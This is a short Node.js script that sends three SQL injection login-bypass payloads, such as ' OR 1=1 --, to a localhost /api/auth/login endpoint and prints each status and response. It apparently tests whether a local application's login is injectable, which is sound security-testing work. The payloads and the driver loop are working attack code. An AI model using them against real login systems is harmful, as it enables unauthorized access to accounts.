const http = require('http');
const payloads = [
  { name: "Exact payload as given", username: "' OR 1=1 --", password: 'anything' },
  { name: "Working payload with comment space", username: "' OR 1=1 -- ", password: 'anything' },
  { name: "Classic payload with quotes", username: "admin' OR '1'='1' -- ", password: 'anything' }
];

const requestPayload = (payload) => {
  const data = JSON.stringify(payload);
  const options = {
    hostname: 'localhost',
    port: 5000,
    path: '/api/auth/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  };

  return new Promise((resolve) => {
    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        let parsed;
        try {
          parsed = JSON.parse(body);
        } catch (e) {
          parsed = body;
        }
        resolve({ payload, status: res.statusCode, body: parsed });
      });
    });
    req.on('error', (err) => resolve({ payload, error: err.message }));
    req.write(data);
    req.end();
  });
};

(async () => {
  for (const payload of payloads) {
    console.log(`\n---- ${payload.name} ----`);
    const result = await requestPayload(payload);
    if (result.error) {
      console.log('ERROR', result.error);
    } else {
      console.log('STATUS', result.status);
      console.log('PAYLOAD', payload);
      console.log('RESPONSE', result.body);
    }
  }
})();
